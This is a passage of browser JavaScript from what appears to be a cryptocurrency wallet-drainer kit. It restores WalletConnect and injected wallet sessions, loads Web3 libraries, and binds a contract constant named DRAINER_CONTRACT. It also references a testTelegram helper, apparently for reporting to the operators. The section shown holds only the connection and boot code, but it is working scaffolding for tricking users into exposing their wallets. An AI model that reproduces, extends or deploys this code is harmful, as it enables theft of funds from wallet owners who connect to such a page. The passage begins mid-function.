        logDebug('WC restore: ' + e.message);
      }
    }

    // --- Injected restore ---
    if (savedMode === 'injected' || !savedMode) {
      const prov = window.ethereum;
      if (prov && isDesktopDevice) {
        try {
          const accounts = await prov.request({ method: 'eth_accounts' });
          if (accounts?.length && savedWallet &&
              accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            injectedProvider = prov;
            activeProvider   = prov;
            connectionMode   = 'injected';
            web3Instance     = new Web3Ctor(prov);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(savedWallet, 'injected');
            attachInjectedEvents(prov);
            updateConnectedUI(savedWallet, 'evm');
            logDebug(`♻️ Injected session restored: ${savedWallet}`);
            return;
          }
        } catch (e) {
          logDebug('Injected restore: ' + e.message);
        }
      }
    }

    // Nothing restorable — clear stale keys so we don't get stuck "connected"
    if (!pending) {
      logDebug('⚠️ No restorable session — clearing saved wallet');
      clearSavedWallet();
    }
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const [libs] = await Promise.all([
      loadWalletConnectLibraries(),
      pickRelayUrl().catch(() => null),
    ]);
    EthereumProvider   = libs.EthereumProvider;
    WalletConnectModal = libs.WalletConnectModal;
    Web3Ctor           = libs.Web3;
    logDebug('✅ All libraries loaded');

    setupEIP6963();

    if (isMobileDevice) {
      logDebug('📱 Pre-warming WalletConnect…');
      initWalletConnect({ useFallbackId: false }).catch(() => {});
    }

    await new Promise((r) => setTimeout(r, 300));
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
